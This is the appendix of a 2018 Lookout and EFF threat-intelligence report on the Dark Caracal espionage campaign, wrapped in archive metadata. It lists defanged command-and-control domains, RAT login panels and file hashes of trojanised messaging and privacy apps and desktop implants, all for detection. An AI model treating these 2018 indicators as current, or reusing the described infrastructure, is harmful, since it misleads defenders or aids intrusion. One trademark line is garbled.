included IRIS\n\nRAT, Bandook, and Arcom RAT. We found these servers hosting exfiltrated desktop content, Windows malware signed by\n\n“alecouperus@mail[.]com”, and the CrossRAT trojan.\n\nAll of these domains share the same IP on more than one occasion and have migrated between hosting providers in the same\n\ntime window. Most of these domains were hosted on Shinjiru, the same hosting server for the Android campaign.\n\nancmax[.]com sabisint[.]com\n\nplanethdx[.]com megadeb[.]com\n\nmecodata[.]com roxsoft[.]net\n\nglobalmic[.]net flexberry[.]com\n\nkaliex[.]net opwalls[.]com\n\naxroot[.]com\n\nThe following screenshot shows HTTP 200 OK response codes for http://<server>/<Payload>/\n\nEach of the following directories contained a login panel for either IRIS RAT or Arcom RAT.\n\n**Figure 34: Various RAT login portals found on a mix of the C2 servers**\n\n|ancmax[.]com planethdx[.]com mecodata[.]com globalmic[.]net kaliex[.]net axroot[.]com|sabisint[.]com megadeb[.]com roxsoft[.]net flexberry[.]com opwalls[.]com|\n|---|---|\n\n\n-----\n\nUsing the Wayback Machine we identified the signature Win32 apache server running on skypeupdate[.]com in 2016. This server\n\nwas first seen resolving to an IP belonging to Shinjiru in late 2013 and last seen resolving to a Shinjiru IP in late 2016.\n\nThe oldest domain we identified as part of this infrastructure is flexberry[.]com. The following screenshot shows passive DNS\n\nresolution dating back to 2010.\n\n**Figure 35: Passive DNS resolutions for the infrastructure**\n\n\n-----\n\n### Appendix\n\n###### Indicators of Compromise and Actor Tracking\n\n\n-----\n\n(continued from page 46)\n\narablivenews[.]com\n\necowatchasia[.]com\n\netn9[.]com\n\nancmax[.]com\n\ntenoclock[.]net\n\nkaliex[.]net\n\nmangoco[.]net\n\njaysonj.no-ip[.]biz\n\norange2015[.]net\n\nskypeservice.no-ip[.]org\n\n###### Mobile Implant Apps\n\n|IOC|Type|PackageName|\n|---|---|---|\n|b0151434815f8b3796ab83848bf6969a2b2ad721|SHA1|com.primo.mobile.android.app|\n|bfbe5218a1b4f8c55eadf2583a2655a49bf6a884|SHA1|org.thoughtcrime.securesms|\n|47243997992d253f7c4ea20f846191697999cd57|SHA1|com.psiphon3|\n|ed4754effda466b8babf87bcba2717760f112455|SHA1|com.gbwhatsapp|\n|309038fceb9a5eb6af83bd9c3ed28bf4487dc27d|SHA1|org.telegram.plus|\n|eaed6ce848e68d5ec42837640eb21d3bfd9ae692|SHA1|org.torproject.android|\n|edf037efc400ccb9f843500103a208fe1f254453|SHA1|org.telegram.plus|\n|35b70d89af691ac244a547842b7c8dfd9a7233fe|SHA1|ch.threema.app|\n|7d47da505f8d3ee153629b373f6792c8858f76e8|SHA1|com.flashplayer.player|\n|4896b0c957b6a985b2b6efe2ffe517dceaa6ce01|SHA1|com.flashplayer.player|\n|6a2d5c0a4cc5b5053f5c8f15c447316fae66b57b|SHA1|com.flashplayer.player|\n\n\n-----\n\n###### Desktop Implant Apps\n\n SHA2 Sum File Type\n\nce583821191345274cd954b2db7da9742c239fe413fc17dcb97ffdd7b51cb072 MS Windows HtmlHelp Data\n\nba4e063472a2559b4baa82d5272304a1cdae6968145c5ef221295c90e88458e2 PE32 executable (DLL) (GUI) Intel 80386\n\n26419a0b6e033cdcb7bf4ca6b0b24fda35490cc6f2796682fb9403620f63d428 PE32 executable (GUI) Intel 80386\n\n15af5bbf3c8d5e5db41fd7c3d722e8b247b40f2da747d5c334f7fd80b715a649 Zip archive data\n\n22eee43887e94997f9f9786092ffd3a9b51f059924cba678cf7b62cfafa65b28 PE32 executable (GUI) Intel 80386\n\nfcf8f9566868d65d901fd6db9a8d6decacb860f5595f84a6a878193eda11549d PDF document, version 1.6\n\nf2178146741f91923c7d3e2442bd08605ed5a0927736e8cfdea00c055b2c6284 PDF document, version 1.6\n\n6b6d363d653785f420dcc1a23c9d9b8b76b8647209b52562b774c793dc0e3f6b data\n\na3ae05a134b30b8c8869d0acd65ed5bca160988b404c146a325f2399b9c1a243 PE32 executable (DLL) (GUI) Intel 80386\n\ne5eeb0a46dac58b171ebcefec60e9ff351fc7279d95892c6f48f799a1a364215 Composite Document File V2 Document\n\n400bca713ba1def9cdbc0e84fc97447db2fa3d12b1c5ef352ef985b7787b6ca4 Microsoft Word 2007+\n\n5e0d061531071e53b3b993e06ce20dae6389a7e9eba5d7887399de48e2f2d278 Composite Document File V2\n\nf9f2e632535b214a0fab376b32cbee1cab6507490c22ba9e12cfa417ed8d72bb MS-DOS executable\n\nbf600e7b27bdd9e396e5c396aba7f079c244bfb92ee45c721c2294aa36586206 PE32 executable (GUI)\n\nda81aec00b563123d2fbd14fb6a76619c90f81e83c5bd8aa0676922cae96b9ad PE32 executable (GUI) Intel 80386\n\n9cf3d3c0b790cebeacb8cb577cd346a6513b1b74fa120aff8984aa022301562e PE32 executable (DLL) (GUI) Intel 80386\n\n091ae8d5649c4e040d25550f2cdf7f1ddfc9c698e672318eb1ab6303aa1cf85b PE32 executable (GUI) Intel 80386\n\na91c2cad20935a85d6eed72ef663254396914811f043018732d29276424a9578 PE32 executable (GUI) Intel 80386\n\nb6ac374f79860ae99736aaa190cce5922a969ab060d7ae367dbfa094bfe4777d PE32 executable (GUI) Intel 80386\n\ned97719c008422925ae21ff34448a8c35ee270a428b0478e24669396761d0790 PE32 executable (GUI) Intel 80386\n\n5c1622cabf21672a8a5379ce8d0ee0ba6d5bc137657f3779faa694fcc4bb3988 PE32 executable (GUI) Intel 80386\n\n86f1bbda3ebf03a0f0a79d7bd1db68598ace9465f5cebb7f66773f8a818b4e8b PE32 executable (DLL) (GUI) Intel 80386\n\n675c3d96070dc9a0e437f3e1b653b90dbc6700b0ec57379d4139e65f7d2799cd PE32 executable (DLL) (GUI) Intel 80386\n\ned25b0c20b1c1b271a511a1266fe3967ab851aaa9f793bdf4f3d19de1dcf6532 PE32 executable (GUI) Intel 80386\n\nf581a75a0f8f8eb200a283437bed48f30ae9d5616e94f64acfd93c12fcef987a PE32 executable (GUI) Intel 80386\n\nd57701321f2f13585a02fc8ba6cbf1f2f094764bfa067eb73c0101060289b0ba PE32 executable (GUI) Intel 80386\n\n|SHA2 Sum|File Type|\n|---|---|\n|ce583821191345274cd954b2db7da9742c239fe413fc17dcb97ffdd7b51cb072|MS Windows HtmlHelp Data|\n|ba4e063472a2559b4baa82d5272304a1cdae6968145c5ef221295c90e88458e2|PE32 executable (DLL) (GUI) Intel 80386|\n|26419a0b6e033cdcb7bf4ca6b0b24fda35490cc6f2796682fb9403620f63d428|PE32 executable (GUI) Intel 80386|\n|15af5bbf3c8d5e5db41fd7c3d722e8b247b40f2da747d5c334f7fd80b715a649|Zip archive data|\n|22eee43887e94997f9f9786092ffd3a9b51f059924cba678cf7b62cfafa65b28|PE32 executable (GUI) Intel 80386|\n|fcf8f9566868d65d901fd6db9a8d6decacb860f5595f84a6a878193eda11549d|PDF document, version 1.6|\n|f2178146741f91923c7d3e2442bd08605ed5a0927736e8cfdea00c055b2c6284|PDF document, version 1.6|\n|6b6d363d653785f420dcc1a23c9d9b8b76b8647209b52562b774c793dc0e3f6b|data|\n|a3ae05a134b30b8c8869d0acd65ed5bca160988b404c146a325f2399b9c1a243|PE32 executable (DLL) (GUI) Intel 80386|\n|e5eeb0a46dac58b171ebcefec60e9ff351fc7279d95892c6f48f799a1a364215|Composite Document File V2 Document|\n|400bca713ba1def9cdbc0e84fc97447db2fa3d12b1c5ef352ef985b7787b6ca4|Microsoft Word 2007+|\n|5e0d061531071e53b3b993e06ce20dae6389a7e9eba5d7887399de48e2f2d278|Composite Document File V2|\n|f9f2e632535b214a0fab376b32cbee1cab6507490c22ba9e12cfa417ed8d72bb|MS-DOS executable|\n|bf600e7b27bdd9e396e5c396aba7f079c244bfb92ee45c721c2294aa36586206|PE32 executable (GUI)|\n|da81aec00b563123d2fbd14fb6a76619c90f81e83c5bd8aa0676922cae96b9ad|PE32 executable (GUI) Intel 80386|\n|9cf3d3c0b790cebeacb8cb577cd346a6513b1b74fa120aff8984aa022301562e|PE32 executable (DLL) (GUI) Intel 80386|\n|091ae8d5649c4e040d25550f2cdf7f1ddfc9c698e672318eb1ab6303aa1cf85b|PE32 executable (GUI) Intel 80386|\n|a91c2cad20935a85d6eed72ef663254396914811f043018732d29276424a9578|PE32 executable (GUI) Intel 80386|\n|b6ac374f79860ae99736aaa190cce5922a969ab060d7ae367dbfa094bfe4777d|PE32 executable (GUI) Intel 80386|\n|ed97719c008422925ae21ff34448a8c35ee270a428b0478e24669396761d0790|PE32 executable (GUI) Intel 80386|\n|5c1622cabf21672a8a5379ce8d0ee0ba6d5bc137657f3779faa694fcc4bb3988|PE32 executable (GUI) Intel 80386|\n|86f1bbda3ebf03a0f0a79d7bd1db68598ace9465f5cebb7f66773f8a818b4e8b|PE32 executable (DLL) (GUI) Intel 80386|\n|675c3d96070dc9a0e437f3e1b653b90dbc6700b0ec57379d4139e65f7d2799cd|PE32 executable (DLL) (GUI) Intel 80386|\n|ed25b0c20b1c1b271a511a1266fe3967ab851aaa9f793bdf4f3d19de1dcf6532|PE32 executable (GUI) Intel 80386|\n|f581a75a0f8f8eb200a283437bed48f30ae9d5616e94f64acfd93c12fcef987a|PE32 executable (GUI) Intel 80386|\n\n\n-----\n\n###### About Lookout\n\nLookout is a cybersecurity company for a world run by apps.\n\nPowered by the largest dataset of mobile code in existence,\n\nLookout is the security platform of record for mobile device\n\nintegrity and data access. Lookout is trusted by hundreds\n\nof millions of individuals, hundreds of enterprises and\n\ngovernment agencies, and such ecosystem partners as AT&T,\n\nDeutsche Telekom, and Microsoft. Headquartered in San\n\nFrancisco, Lookout has offices in Amsterdam, Boston, London,\n\nSydney, Tokyo, Toronto and Washington, D.C.\n\n###### About EFF\n\nThe Electronic Frontier Foundation is the leading nonprofit\n\norganization defending civil liberties in the digital world.\n\nFounded in 1990, EFF champions user privacy, free expression,\n\nand innovation through impact litigation, policy analysis,\n\ngrassroots activism, and technology development. We work to\n\nensure that rights and freedoms are enhanced and protected as\n\nour use of technology grows.\n\n###### Contributors\n\nAndrew Blaich, Lookout\n\nApurva Kumar, Lookout\n\nJeremy Richards, Lookout\n\nMichael Flossman, Lookout\n\nCooper Quintin, EFF\n\nEva Galperin, EFF\n\nSpecial thanks to the many others in our organization, and to our\n\npartners, who contributed significantly to this work.\n\n\n**Lookout Website**\n\n[www.lookout.com](https://www.lookout.com/)\n\n**Blog**\n\n[blog.lookout.com](https://blog.lookout.com/)\n\n**Email**\n\n[threatintel@lookout.com](mailto:threatintel%40lookout.com?subject=Dark%20Caracal)\n\n**Twitter**\n\n[@lookout](https://twitter.com/lookout)\n\n\n**EFF Website**\n\n[www.eff.org](https://www.eff.org/)\n\n**Blog**\n\n[www.eff.org/deeplinks](https://www.eff.org/deeplinks)\n\n**Email**\n\n[press@eff.org](mailto:press%40eff.org?subject=Dark%20Caracal)\n\n**Twitter**\n\n[@eff](https://twitter.com/EFF)\n\n\n1-888-988-5795  |  lookout.com\n\n© 2018 Lookout, Inc. LOOKOUT[®], the Lookout Shield Design[®], LOOKOUT with Shield Design[®], SCREAM[®], and SIGNAL FLARE[®] are registered trademarks of Lookout, Inc.\nin the United States and other countries. EVERYTHING IS OK[®], LOOKOUT MOBILE SECURITY[®], and PROTECTED BY LOOKOUT[®], are registered trademarks of Lookout,\nI i th U it d St t POWERED BY LOOKOUT[™] i t d k f L k t I All th b d d d t t d k i t d t d k f th i\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf",
        "https://app.box.com/s/f1zm9fcemfnuthad4yb8oz2rbplc3t41",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.01.18.Dark_Caracal/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf"
    ],
    "report_names": [
        "Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf",
        "Lookout_Dark-Caracal_srr_20180118_us_v.1.0(01-18-2018)",
        "Lookout_Dark-Caracal_srr_20180118_us_v.1.0"
    ],
    "threat_actors": [
        {
            "id": "af704c54-a580-4c29-95f2-82db06fbb6f9",
            "created_at": "2022-10-25T16:07:23.525064Z",
            "updated_at": "2025-03-27T02:02:09.845137Z",
            "deleted_at": null,
            "main_name": "Dark Caracal",
            "aliases": [
                "ATK 27",
                "Operation Dark Caracal",
                "TAG-CT3"
            ],
            "source_name": "ETDA:Dark Caracal",
            "tools": [
                "Bandok",
                "Bandook",
                "CrossRAT",
                "FinFisher",
                "FinFisher RAT",
                "FinSpy",
                "Pallas",
                "Trupto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d4347dfe-2489-4fe4-8097-f4be33aadac2",
            "created_at": "2022-10-25T16:07:23.973289Z",
            "updated_at": "2025-03-27T02:02:10.057398Z",
            "deleted_at": null,
            "main_name": "Operation Manul",
            "aliases": [],
            "source_name": "ETDA:Operation Manul",
            "tools": [
                "Bandok",
                "Bandook",
                "JRat",
                "Jacksbot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5e7c75c6-097f-4d80-8c98-73485fe2a729",
            "created_at": "2022-10-25T16:07:24.386715Z",
            "updated_at": "2025-03-27T02:02:10.203847Z",
            "deleted_at": null,
            "main_name": "Volatile Cedar",
            "aliases": [
                "Dancing Salome",
                "DeftTorero"
            ],
            "source_name": "ETDA:Volatile Cedar",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Adminer",
                "DirBuster",
                "GoBuster",
                "JuicyPotato",
                "RottenPotato",
                "SharPyShell"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4a62c0be-1583-4d82-8f91-46e3a1c114e6",
            "created_at": "2023-01-06T13:46:38.73639Z",
            "updated_at": "2025-03-27T02:00:02.905024Z",
            "deleted_at": null,
            "main_name": "Dark Caracal",
            "aliases": [
                "G0070"
            ],
            "source_name": "MISPGALAXY:Dark Caracal",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8de10e16-817c-4907-bd98-b64cf4a3e77b",
            "created_at": "2022-10-25T15:50:23.552766Z",
            "updated_at": "2025-03-27T02:00:55.497706Z",
            "deleted_at": null,
            "main_name": "Dark Caracal",
            "aliases": [
                "Dark Caracal"
            ],
            "source_name": "MITRE:Dark Caracal",
            "tools": [
                "FinFisher",
                "CrossRAT",
                "Bandook"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "bc5c22a8-29eb-4a87-acd6-4817060e80f2",
            "created_at": "2022-10-25T15:50:23.658256Z",
            "updated_at": "2025-03-27T02:00:55.514297Z",
            "deleted_at": null,
            "main_name": "Volatile Cedar",
            "aliases": [
                "Volatile Cedar",
                "Lebanese Cedar"
            ],
            "source_name": "MITRE:Volatile Cedar",
            "tools": [
                "Caterpillar WebShell"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9c884c88-2c9f-49c5-856a-2383ad1d8ef8",
            "created_at": "2024-05-01T02:03:08.152Z",
            "updated_at": "2025-03-27T02:05:17.422887Z",
            "deleted_at": null,
            "main_name": "ZINC EMERSON",
            "aliases": [
                "Dropping Elephant ",
                "EHDevel ",
                "Manul ",
                "Monsoon ",
                "Operation Hangover ",
                "Patchwork ",
                "TG-4410 ",
                "Viceroy Tiger ",
                "Confucius "
            ],
            "source_name": "Secureworks:ZINC EMERSON",
            "tools": [
                " Hanove",
                " Mac OS X KitM Spyware",
                " Proyecto2",
                " YTY Backdoor",
                "Enlighten Infostealer"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "17b152bc-6f7e-463c-8b4c-a4844caea6df",
            "created_at": "2023-01-06T13:46:38.498795Z",
            "updated_at": "2025-03-27T02:00:02.849085Z",
            "deleted_at": null,
            "main_name": "Volatile Cedar",
            "aliases": [
                "Lebanese Cedar",
                "DeftTorero"
            ],
            "source_name": "MISPGALAXY:Volatile Cedar",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c39b0fe6-5642-4717-9a05-9e94265e3e3a",
            "created_at": "2022-10-25T16:07:24.332084Z",
            "updated_at": "2025-03-27T02:02:10.175452Z",
            "deleted_at": null,
            "main_name": "Tonto Team",
            "aliases": [
                "Bronze Huntley",
                "CactusPete",
                "Earth Akhlut",
                "HartBeat",
                "Karma Panda",
                "LoneRanger",
                "Operation Bitter Biscuit",
                "TAG-74",
                "Tonto Team"
            ],
            "source_name": "ETDA:Tonto Team",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Bioazih",
                "Bisonal",
                "CONIME",
                "Dexbia",
                "Korlia",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "POISONPLUG.SHADOW",
                "RoyalRoad",
                "ShadowPad Winnti",
                "XShellGhost"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716502,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1516183972,
    "ts_modification_date": 1516183982,
    "files": {
        "pdf": "https://archive.orkl.eu/d5c605fd42adb5312d17a54d246d8178a6a9094c.pdf",
        "text": "https://archive.orkl.eu/d5c605fd42adb5312d17a54d246d8178a6a9094c.txt",
        "img": "https://archive.orkl.eu/d5c605fd42adb5312d17a54d246d8178a6a9094c.jpg"
    }
}